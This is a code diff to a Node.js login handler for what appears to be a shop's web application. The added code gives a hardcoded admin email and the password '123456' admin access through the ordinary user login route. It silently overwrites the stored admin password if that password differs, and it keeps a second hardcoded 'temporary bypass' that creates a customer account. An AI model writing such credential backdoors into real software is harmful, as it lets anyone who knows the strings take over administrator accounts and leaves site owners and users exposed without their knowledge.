@@ -34,13 +34,29 @@ exports.loginUser = async (req, res, next) => {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ success: false, error: 'Please provide email and password' });
 
+    // Safety bypass for admin credentials in user login
+    const trimmedEmail = (email || '').trim().toLowerCase();
+    if (trimmedEmail === 'riddhamart@gmail.com' && password === '123456') {
+      const Admin = require('../models/Admin');
+      let admin = await Admin.findOne({ email: trimmedEmail }).select('+password');
+      if (admin) {
+        // Ensure password matches
+        const isMatch = await admin.matchPassword(password);
+        if (!isMatch) {
+          admin.password = password;
+          await admin.save();
+        }
+        return sendTokenResponse(admin, 200, res);
+      }
+    }
+
     // Temporary bypass for requested user credentials
-    if (email === 'user@gmail.com' && password === '123456') {
-      let user = await User.findOne({ email }).select('+password');
+    if (trimmedEmail === 'user@gmail.com' && password === '123456') {
+      let user = await User.findOne({ email: trimmedEmail }).select('+password');
       if (!user) {
         user = await User.create({
           fullName: 'Riddha User',
-          email,
+          email: trimmedEmail,
           password,
           userType: 'customer'
         });
